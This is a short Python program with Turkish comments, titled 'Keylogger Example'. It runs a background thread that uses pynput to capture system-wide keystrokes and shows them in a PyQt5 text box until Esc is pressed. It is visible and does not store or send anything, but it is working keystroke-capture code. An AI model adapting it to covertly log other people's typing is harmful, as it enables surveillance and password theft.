import sys
from PyQt5.QtWidgets import QApplication, QMainWindow, QTextEdit
from pynput import keyboard
from threading import Thread

class KeyloggerThread(Thread):
    def __init__(self, text_edit):
        super().__init__()
        self.text_edit = text_edit

    def run(self):
        def on_press(key):
            try:
                # Eğer basılan tuş bir karakter ise, metin kutusuna ekle
                self.text_edit.append(key.char)
            except AttributeError:
                # Eğer basılan tuş bir özel tuş ise, işlem yapma
                pass

        def on_release(key):
            if key == keyboard.Key.esc:
                # Eğer 'esc' tuşuna basılırsa dinleme durdurulur
                return False

        # Olay dinleyicilerini oluşturma
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()

def main():
    app = QApplication(sys.argv)
    window = QMainWindow()
    window.setGeometry(100, 100, 400, 250)
    window.setWindowTitle("Keylogger Example")

    text_edit = QTextEdit(window)
    text_edit.move(50, 50)
    text_edit.resize(300, 150)

    # Arka planda keylogger'ı çalıştıran bir thread oluştur
    keylogger_thread = KeyloggerThread(text_edit)
    keylogger_thread.start()

    window.show()
    sys.exit(app.exec_())

if __name__ == "__main__":
    main()